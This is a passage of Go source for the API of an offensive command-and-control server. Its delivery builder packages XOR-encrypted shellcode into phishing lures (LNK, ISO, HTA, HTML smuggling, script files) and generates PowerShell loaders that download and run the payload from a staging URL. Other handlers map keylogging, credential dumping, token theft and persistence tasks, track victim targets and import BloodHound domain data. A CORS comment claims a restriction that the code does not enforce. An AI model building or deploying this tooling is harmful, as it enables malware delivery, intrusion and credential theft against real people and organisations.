		Gradient    gradient     `json:"gradient"`
		LegendItems []legendItem `json:"legendItems"`
		HideDisabled bool        `json:"hideDisabled"`
		ShowTacticRowBackground bool `json:"showTacticRowBackground"`
	}

	// task-type → ATT&CK technique ID
	techMap := map[string]string{
		"SHELL":            "T1059",
		"SYSINFO":          "T1082",
		"PS":               "T1057",
		"PORT_SCAN":        "T1046",
		"SCREENSHOT":       "T1113",
		"CLIP_GET":         "T1115",
		"KEYLOG_START":     "T1056.001",
		"KEYLOG_DUMP":      "T1056.001",
		"KEYLOG_STOP":      "T1056.001",
		"DOWNLOAD":         "T1041",
		"UPLOAD":           "T1105",
		"STAGE2":           "T1105",
		"INJECT_REMOTE":    "T1055",
		"INJECT_APC":       "T1055.004",
		"FORK_RUN":         "T1055",
		"TOKEN_STEAL":      "T1134.001",
		"TOKEN_MAKE":       "T1134.003",
		"TOKEN_WHOAMI":     "T1134",
		"REV2SELF":         "T1134",
		"MINIDUMP":         "T1003.001",
		"PERSIST":          "T1547",
		"PERSIST_RM":       "T1547",
		"PERSIST_TASK":     "T1053.005",
		"SOCKS_START":      "T1090",
		"SOCKS5_START":     "T1090",
		"RSOCKS_START":     "T1090.002",
		"HTTP_PIVOT_START": "T1090",
		"TCP_PIVOT_START":  "T1090",
		"PORTFWD_ADD":      "T1572",
		"WINRM_EXEC":       "T1021.006",
		"WINRM_DEPLOY":     "T1021.006",
		"PIPE_START":       "T1021.002",
		"CLEANUP":          "T1070",
		"ISHELL_OPEN":      "T1059",
		"ISHELL_RUN":       "T1059",
	}

	data, err := s.db.GetReportData()
	if err != nil {
		jsonErr(w, "db: "+err.Error(), http.StatusInternalServerError)
		return
	}

	// Count per technique
	counts := map[string]int{}
	for _, e := range data.Events {
		if tid, ok := techMap[e.Type]; ok {
			counts[tid]++
		}
	}

	maxScore := 1
	for _, c := range counts {
		if c > maxScore { maxScore = c }
	}

	var techs []technique
	for tid, cnt := range counts {
		techs = append(techs, technique{
			TechniqueID: tid,
			Score:       min(100, cnt*100/maxScore),
			Comment:     fmt.Sprintf("Observed %d time(s)", cnt),
			Enabled:     true,
		})
	}

	out := layer{
		Name:        "C2 — Observed Techniques",
		Versions:    versions{Attack: "14", Navigator: "4.9.5", Layer: "4.5"},
		Domain:      "enterprise-attack",
		Description: fmt.Sprintf("Auto-generated by C2 —%s", time.Now().UTC().Format("2006-01-02 15:04 UTC")),
		Techniques:  techs,
		Gradient:    gradient{Colors: []string{"#ffffff00", "#ff6666ff"}, MinValue: 0, MaxValue: 100},
		LegendItems: []legendItem{{Label: "Observed technique", Color: "#ff6666"}},
	}

	// CORS: restrict to the local GUI origin only.
	// NOTE: this prevents mitre-attack.github.io from fetching the layer directly via #layerURL=;
	// download the JSON manually and import it into Navigator if that workflow is needed.
	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Content-Type", "application/json")
	if err := json.NewEncoder(w).Encode(out); err != nil {
		s.printf("[!] attack-layer encode: %v\n", err)
	}
}

// apiNetInfo returns the IPv4 addresses of all non-loopback interfaces on the C2 server.
func (s *Server) apiNetInfo(w http.ResponseWriter, r *http.Request) {
	type iface struct {
		Name string   `json:"name"`
		IPs  []string `json:"ips"`
	}
	var result []iface
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		if i.Flags&net.FlagLoopback != 0 || i.Flags&net.FlagUp == 0 {
			continue
		}
		addrs, _ := i.Addrs()
		var ips []string
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ip4 := ipnet.IP.To4(); ip4 != nil {
					ips = append(ips, ip4.String())
				}
			}
		}
		if len(ips) > 0 {
			result = append(result, iface{Name: i.Name, IPs: ips})
		}
	}
	jsonOK(w, result)
}

var (
	pubIPCache   string
	pubIPCacheAt time.Time
	pubIPCacheMu sync.Mutex
)

func (s *Server) apiPubIP(w http.ResponseWriter, r *http.Request) {
	pubIPCacheMu.Lock()
	defer pubIPCacheMu.Unlock()

	if pubIPCache != "" && time.Since(pubIPCacheAt) < 5*time.Minute {
		jsonOK(w, map[string]string{"ip": pubIPCache})
		return
	}

	services := []string{
		"https://api.ipify.org?format=text",
		"https://icanhazip.com",
		"https://checkip.amazonaws.com",
	}

	client := &http.Client{Timeout: 5 * time.Second}
	for _, svc := range services {
		resp, err := client.Get(svc)
		if err != nil {
			continue
		}
		body, err := io.ReadAll(io.LimitReader(resp.Body, 64))
		resp.Body.Close()
		if err != nil {
			continue
		}
		ip := strings.TrimSpace(string(body))
		if net.ParseIP(ip) != nil {
			pubIPCache = ip
			pubIPCacheAt = time.Now()
			jsonOK(w, map[string]string{"ip": ip})
			return
		}
	}

	http.Error(w, "could not determine public IP", http.StatusServiceUnavailable)
}

// ── Delivery builder ─────────────────────────────────────────────────────────

// DeliverConfig describes a standalone delivery wrapper request.
type DeliverConfig struct {
	Wrapper    string `json:"wrapper"`       // lnk|iso|hta|html|ps1|bat|jscript|vbscript|sct|wsf|zip
	Artifact   string `json:"artifact"`      // filename from bin/payloads/ (EXE or BIN)
	StageURL   string `json:"stage_url"`     // base C2 URL for shellcode staging
	LureName   string `json:"lure_name"`     // lure filename inside the wrapper (no extension)
	ISOLabel   string `json:"iso_label"`     // volume label for ISO (default: Documents)
	StageMaxDL int    `json:"stage_max_dl"`  // max downloads per staged file (0 = unlimited)
}

func (s *Server) apiDeliver(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		jsonErr(w, "POST required", http.StatusMethodNotAllowed)
		return
	}
	var cfg DeliverConfig
	if err := jsonBody(r, &cfg); err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	if cfg.Artifact == "" {
		jsonErr(w, "artifact required", http.StatusBadRequest)
		return
	}

	root := projectRoot()
	payloadsDir := filepath.Join(root, "bin", "payloads")
	deliveryDir := filepath.Join(root, "bin", "delivery")
	os.MkdirAll(deliveryDir, 0755)

	lureName := cfg.LureName
	if lureName == "" {
		lureName = strings.TrimSuffix(cfg.Artifact, filepath.Ext(cfg.Artifact))
	}
	isoLabel := cfg.ISOLabel
	if isoLabel == "" {
		isoLabel = "Documents"
	}

	// Path-traversal guard
	artifactPath := filepath.Join(payloadsDir, filepath.Base(cfg.Artifact))

	result := map[string]string{}
	op := operatorFromCert(r)

	// HTML smuggling: embeds EXE directly, no shellcode staging needed
	if cfg.Wrapper == "html" {
		htmlPath, err := BuildHTML(artifactPath, deliveryDir, lureName)
		if err != nil {
			jsonErr(w, "build html: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["html"] = htmlPath
		s.printf("[%s] deliver html: artifact=%s\n", op, cfg.Artifact)
		jsonOK(w, result)
		return
	}

	if cfg.StageURL == "" {
		jsonErr(w, "stage_url required for wrapper="+cfg.Wrapper, http.StatusBadRequest)
		return
	}

	// Resolve to raw shellcode (.bin); convert EXE if needed
	binPath := artifactPath
	if !strings.HasSuffix(strings.ToLower(cfg.Artifact), ".bin") {
		var err error
		binPath, err = BuildRAW(artifactPath, payloadsDir)
		if err != nil {
			jsonErr(w, "shellcode: "+err.Error(), http.StatusInternalServerError)
			return
		}
	}

	// XOR-encrypt shellcode before staging
	key, _ := xorKey()
	rawBin, err := os.ReadFile(binPath)
	if err != nil {
		jsonErr(w, "read .bin: "+err.Error(), http.StatusInternalServerError)
		return
	}
	encBin := xorBytes(rawBin, key)
	encFile, encErr := os.CreateTemp(filepath.Dir(binPath), "enc_*.bin")
	if encErr != nil {
		jsonErr(w, "create enc: "+encErr.Error(), http.StatusInternalServerError)
		return
	}
	if _, encErr = encFile.Write(encBin); encErr != nil {
		encFile.Close()
		jsonErr(w, "write enc: "+encErr.Error(), http.StatusInternalServerError)
		return
	}
	encFile.Close()
	encBinPath := encFile.Name()

	binToken, err := RegisterStage(encBinPath, "application/octet-stream", cfg.StageMaxDL)
	if err != nil {
		jsonErr(w, "stage .bin: "+err.Error(), http.StatusInternalServerError)
		return
	}
	binURL := cfg.StageURL + "/stage/" + binToken
	result["bin_stage"] = binURL

	// Build PS loader (reflective DLL preferred, Add-Type fallback)
	var ps string
	if runnerDLL, err := buildRunnerDLL(payloadsDir); err == nil && runnerDLL != "" {
		runnerToken, err := RegisterStage(runnerDLL, "application/octet-stream", cfg.StageMaxDL)
		if err != nil {
			jsonErr(w, "stage runner.dll: "+err.Error(), http.StatusInternalServerError)
			return
		}
		runnerURL := cfg.StageURL + "/stage/" + runnerToken
		ps = psReflectiveLoader(runnerURL, binURL, key)
		result["runner_stage"] = runnerURL
	} else {
		ps = psShellcodeLoader(binURL, key)
	}

	wrap := func(path string, key string, err error) bool {
		if err != nil {
			jsonErr(w, key+": "+err.Error(), http.StatusInternalServerError)
			return false
		}
		result[key] = path
		return true
	}

	switch cfg.Wrapper {
	case "ps1":
		p, e := BuildPS1(ps, lureName, deliveryDir)
		if !wrap(p, "ps1", e) { return }
	case "bat":
		p, e := BuildBAT(ps, lureName, deliveryDir)
		if !wrap(p, "bat", e) { return }
	case "jscript":
		p, e := BuildJScript(ps, lureName, deliveryDir)
		if !wrap(p, "js", e) { return }
	case "vbscript":
		p, e := BuildVBScript(ps, lureName, deliveryDir)
		if !wrap(p, "vbs", e) { return }
	case "sct":
		p, e := BuildSCT(ps, lureName, deliveryDir)
		if !wrap(p, "sct", e) { return }
	case "wsf":
		p, e := BuildWSF(ps, lureName, deliveryDir)
		if !wrap(p, "wsf", e) { return }
	case "hta":
		p, e := BuildHTA(ps, deliveryDir, lureName)
		if !wrap(p, "hta", e) { return }
	case "lnk", "iso", "zip":
		// Stage PS1 and use a short stub in the LNK (~260 chars).
		// Windows truncates LNK Arguments at ~4096 chars; the full encoded
		// loader is 6000+ chars and is silently cut, leaving PS with nothing.
		psArgs, ps1URL, err := StageLNKLoader(ps, cfg.StageURL, deliveryDir)
		if err != nil {
			jsonErr(w, "stage ps1: "+err.Error(), http.StatusInternalServerError)
			return
		}
		result["ps1_stage"] = ps1URL
		switch cfg.Wrapper {
		case "lnk":
			p, e := BuildLNK(psArgs, deliveryDir, lureName)
			if !wrap(p, "lnk", e) { return }
		case "iso":
			lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
			if err != nil {
				jsonErr(w, "lnk: "+err.Error(), http.StatusInternalServerError)
				return
			}
			isoPath, err := BuildISO(map[string]string{lureName + ".lnk": lnkPath}, isoLabel, deliveryDir)
			if !wrap(isoPath, "iso", err) { return }
		case "zip":
			lnkPath, err := BuildLNK(psArgs, deliveryDir, lureName)
			if err != nil {
				jsonErr(w, "lnk: "+err.Error(), http.StatusInternalServerError)
				return
			}
			zipPath, err := BuildZIPLNK(lnkPath, lureName, deliveryDir)
			if !wrap(zipPath, "zip", err) { return }
		}
	default:
		jsonErr(w, "unknown wrapper: "+cfg.Wrapper, http.StatusBadRequest)
		return
	}

	s.printf("[%s] deliver %s: artifact=%s stage=%s…\n", op, cfg.Wrapper, cfg.Artifact, binURL[:min(len(binURL), 60)])
	jsonOK(w, result)
}

// ── Webhooks ──────────────────────────────────────────────────────────────────

func (s *Server) apiWebhooks(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		hooks, err := s.db.ListWebhooks()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, hooks)

	case http.MethodPost:
		var req struct {
			Name   string `json:"name"`
			Type   string `json:"type"`
			URL    string `json:"url"`
			Events string `json:"events"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, "bad json", http.StatusBadRequest)
			return
		}
		if req.URL == "" {
			jsonErr(w, "url required", http.StatusBadRequest)
			return
		}
		if req.Name == "" {
			req.Name = req.Type
		}
		if req.Events == "" {
			req.Events = "checkin"
		}
		if req.Type == "" {
			req.Type = "discord"
		}
		id, err := s.db.AddWebhook(req.Name, req.Type, req.URL, req.Events)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]int64{"id": id})

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// /api/webhooks/{id}  DELETE | PATCH
func (s *Server) apiWebhookAction(w http.ResponseWriter, r *http.Request) {
	idStr := strings.TrimPrefix(r.URL.Path, "/api/webhooks/")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		jsonErr(w, "bad id", http.StatusBadRequest)
		return
	}
	switch r.Method {
	case http.MethodDelete:
		if err := s.db.DeleteWebhook(id); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "deleted")
	case http.MethodPatch:
		var req struct {
			Enabled bool `json:"enabled"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, "bad json", http.StatusBadRequest)
			return
		}
		if err := s.db.ToggleWebhook(id, req.Enabled); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "updated")
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ── Targets ───────────────────────────────────────────────────────────────────

func (s *Server) apiTargets(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		targets, err := s.db.ListTargets()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, targets)

	case http.MethodPost:
		// POST /api/targets         → add single
		// POST /api/targets?import  → import from agents
		if r.URL.Query().Has("import") {
			agents, err := s.db.ListAgents()
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			if err := s.db.ImportTargetsFromAgents(agents); err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]int{"imported": len(agents)})
			return
		}
		var req struct {
			IP       string `json:"ip"`
			Hostname string `json:"hostname"`
			OS       string `json:"os"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, "bad json", http.StatusBadRequest)
			return
		}
		if req.IP == "" && req.Hostname == "" {
			jsonErr(w, "ip or hostname required", http.StatusBadRequest)
			return
		}
		id, err := s.db.AddTarget(req.IP, req.Hostname, req.OS)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]int64{"id": id})

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// /api/targets/{id}   PUT | DELETE
func (s *Server) apiTargetAction(w http.ResponseWriter, r *http.Request) {
	idStr := strings.TrimPrefix(r.URL.Path, "/api/targets/")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		jsonErr(w, "bad id", http.StatusBadRequest)
		return
	}
	switch r.Method {
	case http.MethodPut:
		var req struct {
			IP       string `json:"ip"`
			Hostname string `json:"hostname"`
			OS       string `json:"os"`
			Notes    string `json:"notes"`
			Status   string `json:"status"`
			Tags     string `json:"tags"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, "bad json", http.StatusBadRequest)
			return
		}
		if err := s.db.UpdateTarget(id, req.IP, req.Hostname, req.OS, req.Notes, req.Status, req.Tags); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "updated")
	case http.MethodDelete:
		if err := s.db.DeleteTarget(id); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "deleted")
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ── Reactions ─────────────────────────────────────────────────────────────────

func (s *Server) apiReactions(w http.ResponseWriter, r *http.Request) {
	switch r.Method {
	case http.MethodGet:
		reactions, err := s.db.ListReactions()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, reactions)
	case http.MethodPost:
		var req struct {
			Name     string `json:"name"`
			Event    string `json:"event"`
			TaskType string `json:"task_type"`
			TaskArgs string `json:"task_args"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, "bad json", http.StatusBadRequest)
			return
		}
		if req.TaskType == "" {
			jsonErr(w, "task_type required", http.StatusBadRequest)
			return
		}
		if req.Event == "" {
			req.Event = "checkin"
		}
		if req.Name == "" {
			req.Name = req.Event + ":" + req.TaskType
		}
		id, err := s.db.AddReaction(req.Name, req.Event, req.TaskType, req.TaskArgs)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, map[string]int64{"id": id})
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

func (s *Server) apiReactionAction(w http.ResponseWriter, r *http.Request) {
	idStr := strings.TrimPrefix(r.URL.Path, "/api/reactions/")
	id, err := strconv.ParseInt(idStr, 10, 64)
	if err != nil {
		jsonErr(w, "bad id", http.StatusBadRequest)
		return
	}
	switch r.Method {
	case http.MethodDelete:
		if err := s.db.DeleteReaction(id); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "deleted")
	case http.MethodPatch:
		var req struct {
			Enabled bool `json:"enabled"`
		}
		if err := jsonBody(r, &req); err != nil {
			jsonErr(w, "bad json", http.StatusBadRequest)
			return
		}
		if err := s.db.ToggleReaction(id, req.Enabled); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "updated")
	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}

// ── BloodHound integration ─────────────────────────────────────────────────────

// apiBloodHound handles all /api/bloodhound/* routes.
//   POST   /api/bloodhound           — upload SharpHound ZIP or JSON
//   DELETE /api/bloodhound           — wipe graph
//   GET    /api/bloodhound/graph     — full graph (nodes + edges)
//   GET    /api/bloodhound/context   — AI-friendly domain summary
//   GET    /api/bloodhound/context?hostname=X — host summary
//   GET    /api/bloodhound/stats     — node/edge counts
//   GET    /api/bloodhound/uploads   — upload history
func (s *Server) apiBloodHound(w http.ResponseWriter, r *http.Request) {
	sub := strings.TrimPrefix(r.URL.Path, "/api/bloodhound")
	sub = strings.TrimPrefix(sub, "/")

	switch {
	case r.Method == http.MethodPost && sub == "":
		s.bhUpload(w, r)
	case r.Method == http.MethodDelete && sub == "":
		if err := s.db.BHClearGraph(); err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, "graph cleared")
	case r.Method == http.MethodGet && sub == "graph":
		nodes, edges, err := s.db.BHGetGraph()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		if nodes == nil {
			nodes = []*BHNode{}
		}
		if edges == nil {
			edges = []*BHEdge{}
		}
		jsonOK(w, map[string]any{"nodes": nodes, "edges": edges})
	case r.Method == http.MethodGet && sub == "stats":
		stats, err := s.db.BHGetStats()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, stats)
	case r.Method == http.MethodGet && sub == "context":
		hostname := r.URL.Query().Get("hostname")
		if hostname != "" {
			ctx, err := s.db.BHGetHostContext(hostname)
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]string{"context": ctx})
		} else {
			ctx, err := s.db.BHGetDomainContext()
			if err != nil {
				jsonErr(w, err.Error(), http.StatusInternalServerError)
				return
			}
			jsonOK(w, map[string]string{"context": ctx})
		}
	case r.Method == http.MethodGet && sub == "uploads":
		uploads, err := s.db.BHListUploads()
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, uploads)
	case r.Method == http.MethodPost && sub == "import-local":
		// Import a SharpHound ZIP already on disk (agent upload).
		// Body: {"agent_id":"...","filename":"..."}
		var req struct {
			AgentID  string `json:"agent_id"`
			Filename string `json:"filename"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			jsonErr(w, "bad request: "+err.Error(), http.StatusBadRequest)
			return
		}
		path := filepath.Join("data", "uploads", req.AgentID, filepath.Base(req.Filename))
		data, err := os.ReadFile(path)
		if err != nil {
			jsonErr(w, "file not found: "+err.Error(), http.StatusNotFound)
			return
		}
		g, err := ParseBloodHoundZIP(data)
		if err != nil {
			jsonErr(w, "parse error: "+err.Error(), http.StatusBadRequest)
			return
		}
		if err := s.db.BHUpsertGraph(g); err != nil {
			jsonErr(w, "db error: "+err.Error(), http.StatusInternalServerError)
			return
		}
		s.db.BHAddUpload(req.Filename, len(g.Nodes), len(g.Edges)) //nolint:errcheck
		jsonOK(w, map[string]any{"nodes": len(g.Nodes), "edges": len(g.Edges)})
	default:
		http.Error(w, "not found", http.StatusNotFound)
	}
}

func (s *Server) bhUpload(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 64*1024*1024))
	if err != nil {
		jsonErr(w, "read error", http.StatusBadRequest)
		return
	}

	filename := r.URL.Query().Get("filename")
	if filename == "" {
		if ct := r.Header.Get("Content-Disposition"); ct != "" {
			if idx := strings.Index(ct, "filename="); idx >= 0 {
				filename = strings.Trim(ct[idx+9:], `"`)
			}
		}
	}
	if filename == "" {
		filename = "upload.zip"
	}
	filename = filepath.Base(filename)

	var g *BHGraph
	ext := strings.ToLower(filepath.Ext(filename))
	switch ext {
	case ".zip":
		g, err = ParseBloodHoundZIP(body)
	case ".json":
		g, err = ParseBloodHoundJSON(filename, body)
	default:
		g, err = ParseBloodHoundZIP(body)
		if err != nil || len(g.Nodes) == 0 {
			g, err = ParseBloodHoundJSON(filename, body)
		}
	}
	if err != nil {
		jsonErr(w, "parse error: "+err.Error(), http.StatusBadRequest)
		return
	}
	if len(g.Nodes) == 0 {
		jsonErr(w, "no nodes found — upload a SharpHound ZIP or JSON file", http.StatusBadRequest)
		return
	}

	if err := s.db.BHUpsertGraph(g); err != nil {
		jsonErr(w, "db error: "+err.Error(), http.StatusInternalServerError)
		return
	}
	s.db.BHAddUpload(filename, len(g.Nodes), len(g.Edges)) //nolint:errcheck
	s.printf("[+] BloodHound: imported %d nodes, %d edges from %s\n", len(g.Nodes), len(g.Edges), filename)
	jsonOK(w, map[string]any{
		"nodes":    len(g.Nodes),
		"edges":    len(g.Edges),
		"filename": filename,
	})
}

// apiMesh manages the P2P mesh peer registry.
// GET  /api/mesh         — list active peers
// POST /api/mesh         — manually register a peer {agent_id, addr, proto}
// DELETE /api/mesh/{id}  — remove a peer
func (s *Server) apiMesh(w http.ResponseWriter, r *http.Request) {
	switch {
	case r.Method == http.MethodGet:
		s.meshMu.RLock()
		type peerOut struct {
			AgentID string `json:"agent_id"`
			Addr    string `json:"addr"`
			Proto   string `json:"proto"`
			Updated string `json:"updated"`
		}
		var out []peerOut
		for _, p := range s.meshPeers {
			out = append(out, peerOut{
				AgentID: p.AgentID,
				Addr:    p.Addr,
				Proto:   p.Proto,
				Updated: p.Updated.UTC().Format("2006-01-02T15:04:05Z"),
			})
		}
		s.meshMu.RUnlock()
		if out == nil {
			out = []peerOut{}
		}
		jsonOK(w, out)

	case r.Method == http.MethodPost:
		var req struct {
			AgentID string `json:"agent_id"`
			Addr    string `json:"addr"`
			Proto   string `json:"proto"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.AgentID == "" || req.Addr == "" {
			jsonErr(w, "agent_id and addr required", http.StatusBadRequest)
			return
		}
		if req.Proto == "" {
			req.Proto = "http"
		}
		s.registerMeshPeer(req.AgentID, req.Addr, req.Proto)
		BroadcastGUI("MESH_PEER_UP", req.AgentID, req.Addr)
		jsonOK(w, map[string]string{"status": "registered"})

	case r.Method == http.MethodDelete:
		id := strings.TrimPrefix(r.URL.Path, "/api/mesh/")
		if id == "" {
			jsonErr(w, "agent_id required in path", http.StatusBadRequest)
			return
		}
		s.unregisterMeshPeer(id)
		BroadcastGUI("MESH_PEER_DOWN", id, "")
		jsonOK(w, map[string]string{"status": "removed"})

	default:
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
	}
}


func (s *Server) apiCanaries(w http.ResponseWriter, r *http.Request) {
	rows, err := s.db.ListCanaries()
	if err != nil {
		jsonErr(w, err.Error(), http.StatusInternalServerError)
		return
	}
	jsonOK(w, rows)
}
